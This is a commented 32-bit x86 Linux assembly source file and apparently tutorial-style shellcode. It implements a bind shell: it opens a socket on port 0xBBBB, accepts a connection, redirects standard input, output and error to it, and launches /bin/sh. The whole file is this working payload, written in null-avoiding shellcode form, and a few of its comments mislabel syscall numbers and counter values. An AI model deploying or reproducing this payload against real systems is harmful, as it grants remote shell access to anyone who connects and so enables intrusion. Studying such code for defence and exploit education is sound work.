BITS 32
section .text
global _start
_start:
    xor eax, eax            ; clear eax
    xor ebx, ebx            ; clear ebx
    xor edx, edx            ; clear edx
    
    ; server = socket (2, 1, 0)
    push eax                ; third arg to socket: 0
    push byte 0x1           ; second arg to socket: 1
    push byte 0x2           ; first arg to socket: 2
    mov ecx, esp            ; set addr of array as 2nd arg to socketcall
    inc bl                  ; set first arg to socketcall to # 1
    mov al, 102             ; call socketcall # 1: SYS_SOCKET
    int 0x80                ; jump into kernel mode, execute the syscall
    mov esi, eax            ; store the return value (eax) into esi (server)
    
    ; bind(server, (struct sockadd *) &serv_addr, 0x10)
    push edx                ; still zero, terminate the next value pushed
    push long 0xBBBB02BB    ; build struct:port, sin.family:02, & and 2 bytes:BB
    mov ecx, esp            ; mov addr struct (on stack) to ecx
    push byte 0x10          ; begin the bind args, push 16 (size) on stack
    push ecx                ; save address of struct back on stack
    push esi                ; save server file descriptor (now in esi) to stack
    mov ecx, esp            ; set addr of array as 2 arg to socketcall
    inc bl                  ; set bl to #2, first arg of socket call
    mov al, 102             ; call socketcall # 2: SYS_BIND
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; listen(server, 0)
    push edx                ; still zero, used to terminate the next value pushed
    push esi                ; file descriptor for server (esi) pushed to stack
    mov ecx, esp            ; set addr of array as 2nd arg to socketcall
    mov bl, 0x4             ; move 4 into bl, first arg of socketcall
    mov al, 102             ; call socketcall #4: SYS_LISTEN
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; client = accept(server, 0, 0)
    push edx                ; still zero, third argument to accept pushed to stack
    push edx                ; still zero, second argument to accept pushed to stack
    push esi                ; saved file descriptor for server pushed to stack
    mov ecx, esp            ; args placed into ecx, serves as 2nd arg to socketcall
    inc bl                  ; increment bl to 5; first arg of socketcall
    mov al, 102             ; call socketcall #5: SYS_ACCEPT
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; prepare for dup2 commands, need client file handle saved in ebx
    mov ebx, eax            ; copied return file descriptor of client to ebx
    
    ; dup2(client, 0)
    xor ecx, ecx            ; clear ecx
    mov al, 63              ; set first arg of syscall to 0x63: dup2
    int 0x80                ; jump into
    
    ; dup2(client, 1)
    inc ecx                 ; increment ecx to 1
    mov al, 63              ; set first arg of syscall to 0x63: dup2
    int 0x80                ; jump into
    
    ; dup2(client, 2)
    inc ecx                 ; increment ecx to 1
    mov al, 63              ; set first arg of syscall to 0x63: dup2
    int 0x80                ; jump into
    
    ; standard execve("/bin/sh")
    push edx
    push long 0x68732f2f
    push long 0x6e69622f
    mov ebx, esp
    push edx
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80
    
    ; I added this to prevent the seg fault when program finishes running
    xor eax, eax		; shortcut to zero out the eax register (safely)
    xor ebx, ebx		; shortcut to zero out the ebx register
    mov al, 0x01		; only affects one byte, stops padding of other 24 bits
    int 0x80			; call kernel to execute syscall
    
    
